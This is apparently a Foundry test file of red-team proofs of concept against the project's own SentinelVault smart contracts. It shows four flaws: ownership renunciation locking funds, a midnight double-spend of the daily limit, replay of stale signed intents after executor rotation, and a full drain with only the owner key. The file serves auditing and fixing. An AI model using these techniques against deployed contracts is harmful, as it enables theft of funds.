// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {SentinelVault} from "../src/SentinelVault.sol";
import {SentinelVaultV35} from "../src/SentinelVaultV35.sol";
import {PolicyGuard} from "../src/PolicyGuard.sol";
import {MockQUSDC} from "./mocks/MockQUSDC.sol";
import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";

/// @notice Red-team proofs of concept. Each test PASSES when the weakness EXISTS.
contract TaskforcePoC is Test {
    uint256 private constant OWNER_KEY = 0xA11CE;
    address private owner;
    address private executorA = address(0xE01);
    address private executorB = address(0xE02);
    address private recipient = address(0xCAFE);
    MockQUSDC private token;

    function setUp() public {
        vm.chainId(1990);
        vm.warp(1_800_000_000);
        owner = vm.addr(OWNER_KEY);
        token = new MockQUSDC();
    }

    // ---------- F1: renounceOwnership permanently bricks funds (deployed v1; V35 patched) ----------
    // V35 variant removed: fixed by renounceOwnership override (see TaskforceFixes).
    function testPoC_F1_RenounceBricksDeployedV1Funds() public {
        SentinelVault v = new SentinelVault(address(token), owner, executorA, 250_000, 400_000);
        token.mint(address(v), 1_000_000);
        vm.prank(owner);
        v.renounceOwnership();
        vm.expectRevert();
        vm.prank(owner);
        v.emergencyRecover(owner, 1);
        assertEq(token.balanceOf(address(v)), 1_000_000);
    }

    // ---------- F2: UTC-day bucket allows 2x the "daily" limit within 2 seconds ----------
    function testPoC_F2_MidnightDoubleSpend() public {
        SentinelVaultV35 v = new SentinelVaultV35(address(token), owner, executorA, 400_000, 400_000);
        token.mint(address(v), 1_000_000);
        vm.prank(owner);
        v.setRecipient(recipient, true);
        uint256 nextMidnight = (block.timestamp / 1 days + 1) * 1 days;
        vm.warp(nextMidnight - 1);
        _execV35(v, 1, 400_000);
        vm.warp(nextMidnight);
        _execV35(v, 2, 400_000);
        assertEq(token.balanceOf(recipient), 800_000, "2x dailyLimit moved in 1 second");
    }

    // ---------- F3: deployed v1 — rotating executor A->B->A REVIVES every old A intent ----------
    function testPoC_F3_V1ExecutorRoundTripRevivesStaleIntent() public {
        SentinelVault v = new SentinelVault(address(token), owner, executorA, 250_000, 400_000);
        token.mint(address(v), 1_000_000);
        vm.prank(owner);
        v.setRecipient(recipient, true);
        SentinelVault.Payment memory p = SentinelVault.Payment(
            address(token), recipient, 100_000, 7, block.timestamp + 1 days, executorA
        );
        (uint8 vv, bytes32 r, bytes32 s) = vm.sign(OWNER_KEY, v.paymentDigest(p));
        bytes memory sig = abi.encodePacked(r, s, vv);
        // Owner "revokes" A because the A host was compromised...
        vm.prank(owner);
        v.setExecutor(executorB);
        // ...later restores the same address after "cleaning" the box.
        vm.prank(owner);
        v.setExecutor(executorA);
        vm.prank(executorA);
        v.execute(p, sig); // old, supposedly-revoked intent settles
        assertEq(token.balanceOf(recipient), 100_000);
    }

    // ---------- F4: PolicyGuard cannot stop a compromised owner (it is not a second factor) ----------
    function testPoC_F4_OwnerKeyAloneDrainsEverything() public {
        SentinelVaultV35 v = new SentinelVaultV35(address(token), owner, executorA, 1, 1);
        token.mint(address(v), 1_000_000);
        address thief = address(0xBAD);
        vm.startPrank(owner);
        v.pause();
        v.emergencyRecover(thief, 1_000_000); // bypasses allowlist + daily cap by design
        vm.stopPrank();
        assertEq(token.balanceOf(thief), 1_000_000);
    }

    function _execV35(SentinelVaultV35 v, uint256 nonce, uint256 amount) private {
        SentinelVaultV35.Payment memory p = SentinelVaultV35.Payment({
            token: address(token), recipient: recipient, amount: amount, nonce: nonce,
            deadline: block.timestamp + 3600, executor: v.executor(), ownerEpoch: v.ownerEpoch(),
            executorEpoch: v.executorEpoch(), signerEpoch: v.signerEpoch()
        });
        (uint8 vv, bytes32 r, bytes32 s) = vm.sign(OWNER_KEY, v.paymentDigest(p));
        vm.prank(v.executor());
        v.execute(p, abi.encodePacked(r, s, vv));
    }
}
